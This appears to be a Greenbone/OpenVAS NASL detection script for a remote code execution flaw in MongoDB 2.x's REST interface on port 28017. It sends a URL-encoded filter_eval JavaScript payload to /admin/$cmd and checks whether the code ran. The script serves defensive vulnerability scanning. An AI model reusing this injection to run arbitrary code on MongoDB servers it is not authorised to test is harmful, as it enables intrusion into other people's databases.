CPE = "cpe:/a:mongodb:mongodb";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103870" );
	script_version( "$Revision: 13994 $" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_name( "MongoDB REST Interface Remote Code Execution Vulnerability" );
	script_xref( name: "URL", value: "http://en.securitylab.ru/lab/PT-2012-40" );
	script_xref( name: "URL", value: "http://blog.ptsecurity.com/2012/11/attacking-mongodb.html" );
	script_tag( name: "last_modification", value: "$Date: 2019-03-05 13:23:37 +0100 (Tue, 05 Mar 2019) $" );
	script_tag( name: "creation_date", value: "2014-01-08 13:56:18 +0100 (Wed, 08 Jan 2014)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "This script is Copyright (C) 2014 Greenbone Networks GmbH" );
	script_dependencies( "gb_mongodb_webadmin_detect.sc" );
	script_require_ports( "Services/www", 28017 );
	script_mandatory_keys( "mongodb/webadmin/port" );
	script_tag( name: "impact", value: "An attacker can exploit this vulnerability to execute arbitrary code
  within the context of the affected application." );
	script_tag( name: "vuldetect", value: "Send a special crafted HTTP GET request and check the response." );
	script_tag( name: "insight", value: "If an attacker manages to call the REST interface that is running on port 28017
  by default, the attacker could execute SSJS code." );
	script_tag( name: "solution", value: "Update your software up to the latest version or disable the REST interface." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "summary", value: "MongoDB is prone to a remote code execution vulnerability because it
  fails to properly sanitize user-supplied input." );
	script_tag( name: "affected", value: "MongoDB 2.x is vulnerable." );
	exit( 0 );
}
require("http_func.inc.sc");
require("host_details.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
port = get_kb_item( "mongodb/webadmin/port" );
if(!port){
	port = 28017;
}
if(!get_port_state( port )){
	exit( 0 );
}
vtstrings = get_vt_strings();
extra_check = "_" + vtstrings["lowercase_rand"];
url = "/admin/$cmd/?filter_eval=function%28%29%20{%20val=db.version%28%29;%20bar=val%2b%27" + extra_check + "%27;%20return%20bar;%20}&limit=1";
req = http_get( item: url, port: port );
buf = http_keepalive_send_recv( port: port, data: req, bodyonly: TRUE );
if(!buf || ContainsString( buf, "REST is not enabled" )){
	exit( 0 );
}
if(ContainsString( buf, "total_rows" ) && ContainsString( buf, "retval" ) && IsMatchRegexp( buf, "\"retval\" : \"[0-9.]+" ) + extra_check){
	report = "It was possible to execute SSJS code on the remote mongodb.\n\nRequested URL: " + url + "\nResponse: \n=====\n" + buf + "\n=====";
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

